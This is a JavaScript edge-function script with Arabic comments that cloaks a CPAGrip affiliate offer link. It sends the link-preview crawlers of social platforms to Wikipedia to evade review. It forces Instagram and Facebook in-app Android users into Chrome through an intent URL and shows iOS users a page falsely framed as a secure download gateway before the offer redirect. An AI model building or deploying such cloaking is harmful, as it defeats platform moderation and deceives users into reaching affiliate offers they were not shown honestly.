export const config = {
  runtime: 'edge', // تشغيل الكود عند حافة الشبكة للفحص السريع قبل الدخول
};

export default async function handler(request) {
    const userAgent = request.headers.get('user-agent') || '';
    
    // ⚠️ ضع رابط عروض CPAGrip الحقيقي الخاص بك هنا بدلاً من الرابط التجريبي أدناه:
    const cpaGripUrl = "https://www.cpagrip-link-example.com/show.php?l=0&u=12345"; 
    
    // استخراج الدومين بدون https لأجل نظام الأندرويد
    const cpaGripDomain = cpaGripUrl.replace('https://', '').replace('http://', '');

    // 1. تصفية وعزل زواحف الفحص الآلي للمنصات (التمويه الحقيقي)
    const isBot = /facebookexternalhit|Facebot|Twitterbot|Slackbot|Discordbot|Googlebot|TelegramBot/i.test(userAgent);
    if (isBot) {
        return Response.redirect('https://ar.wikipedia.org', 302);
    }

    // 2. رصد وفلترة زوار إنستغرام وفيسبوك الحقيقيين لتفادي الفلترة الخاطئة
    const isInstagram = userAgent.includes('Instagram');
    const isFacebook = userAgent.includes('FBAN') || userAgent.includes('FBAV');

    if (isInstagram || isFacebook) {
        const isAndroid = /Android/i.test(userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(userAgent);

        if (isAndroid) {
            // حل الأندرويد: كسر الحظر الفوري والإجبار على فتح متصفح Chrome الخارجي
            const androidIntent = `intent://${cpaGripDomain}#Intent; scheme=https; package=com.android.chrome; end;`;
            return Response.redirect(androidIntent, 302);
        }

        if (isIOS) {
            // حل الآيفون: بما أن الخروج التلقائي مستحيل في iOS، يتم حقن واجهة الإرشاد اليدوي فوراً كاستجابة برمجية
            const iosEscapeHtml = `
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
                <title>تأمين بوابة التنزيل</title>
                <style>
                    body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #121214; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; direction: rtl; }
                    .escape-box { max-width: 90%; width: 400px; padding: 30px; background-color: #1e1e24; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; border: 1px solid #2a2a32; }
                    h2 { font-size: 20px; font-weight: bold; margin-bottom: 12px; color: #ffffff; }
                    p { font-size: 14px; color: #a0a0ab; line-height: 1.6; margin-bottom: 25px; }
                    .instruction-steps { text-align: right; }
                    .step { display: flex; align-items: center; margin-bottom: 18px; }
                    .step-num { background-color: #34c759; color: #fff; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-left: 12px; flex-shrink: 0; }
                    .step-text { font-size: 14px; line-height: 1.5; color: #ffffff; }
                    strong { color: #34c759; }
                </style>
            </head>
            <body>
                <div class="escape-box">
                    <h2>يرجى فتح الصفحة في متصفح النظام الافتراضي</h2>
                    <p>لضمان تجربة آمنة وتجنب مشاكل وعوائق التحميل داخل تطبيق إنستغرام، يرجى اتباع الآتي:</p>
                    <div class="instruction-steps">
                        <div class="step">
                            <span class="step-num">1</span>
                            <span class="step-text">اضغط على زر <strong>الخيارات الثلاثة (•••)</strong> في الزاوية العلوية اليمنى للشاشة.</span>
                        </div>
                        <div class="step">
                            <span class="step-num">2</span>
                            <span class="step-text">اختر <strong>فتح في سفاري (Open in Safari)</strong> لتفعيل رابط التحميل المباشر.</span>
                        </div>
                    </div>
                </div>
            </body>
            </html>`;
            
            return new Response(iosEscapeHtml, {
                headers: { 'Content-Type': 'text/html; charset=utf-8' },
            });
        }
    }

    // 3. الترافيك الطبيعي (أو الزائر بعد خروجه للمتصفح الخارجي بنجاح) يمر مباشرة لعروضك الحقيقية
    return Response.redirect(cpaGripUrl, 302);
}
